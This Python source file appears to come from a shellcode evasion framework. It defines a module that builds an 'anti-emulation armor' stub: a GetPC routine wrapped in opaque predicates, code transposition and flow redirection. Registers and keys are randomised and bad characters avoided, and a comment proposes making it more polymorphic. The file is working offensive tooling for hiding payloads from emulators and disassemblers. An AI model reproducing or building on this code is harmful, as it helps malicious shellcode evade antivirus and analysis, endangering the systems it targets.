#!/usr/bin/python

"""
Anti-disassembly-based anti-emulation armor
Anti-emulation armor integrating anti-disassembly instructions
"""

from random import choice, shuffle, randint
from struct import unpack
from assembler.assembler import assembler
from evasion_modules.core.core import evasion_module
from evasion_modules.core.antidisassembly import antidisassembly_builder
from evasion_modules.core.getpc import getpc_stub_builder
from arch.core import stackpointer_registers, word_keywords, arch_registers, bit_packs
from utils.rand import rand_bytes
from utils.bytework import bytes_to_asm

class evasion_antidisassembly(evasion_module):

	def getpc_stub(self, getpc_reg):
		reg_size = 2**self.bits

		stackpointer_reg = stackpointer_registers[self.bits]
		word_keyword = word_keywords[self.bits]

		antidis_builder = antidisassembly_builder(self.arch, self.bits, self.badchars)

		garbage_count = randint(1, 5)
		opaque_stub = bytes_to_asm(antidis_builder.opaque_predicate(garbage_count))

		garbage_count = randint(1, 5)
		transpose_stub = bytes_to_asm(antidis_builder.code_transposition(garbage_count))

		flow_stub = bytes_to_asm(antidis_builder.flow_redirection())

		regs = arch_registers(self.arch, self.bits)
		key_reg = regs.random_gp_reg(False, [])

		key_val = rand_bytes(self.bits / 8, self.badchars)

		getpc_builder = getpc_stub_builder(self.arch, self.bits, self.badchars)
		push_pop_stub = bytes_to_asm(getpc_builder.encoded_stack_getpc_stub(getpc_reg, key_reg, key_val))

		variables = {'opaque_stub': opaque_stub, 'transpose_stub': transpose_stub, 'push_pop_stub': push_pop_stub, 'flow_stub': flow_stub, 'getpc_reg': getpc_reg, 'reg_size': reg_size, 'key_val': unpack(bit_packs[self.bits], key_val)[0], 'key_reg': key_reg}

		# Actual getpc part is done with encoded_stack_getpc_stub for push/pop math
		# and is located in the middle and return is done with adjusted offset
		# This code can be improved by polymorphizing the order and number of the various techniques used

		listing = '''
main:
	{opaque_stub}
	{transpose_stub}
	JMP label_2

label_0:
	MOV {key_reg}, {key_val}
	{push_pop_stub}
label_1:
	ADD {getpc_reg}, (label_3 - label_1)
	JMP {getpc_reg}

label_2:
	{flow_stub}
	JMP label_0
label_3:
'''

		asm = assembler(self.arch, self.bits)
		stub = asm.assemble(listing.format(**variables))
		return stub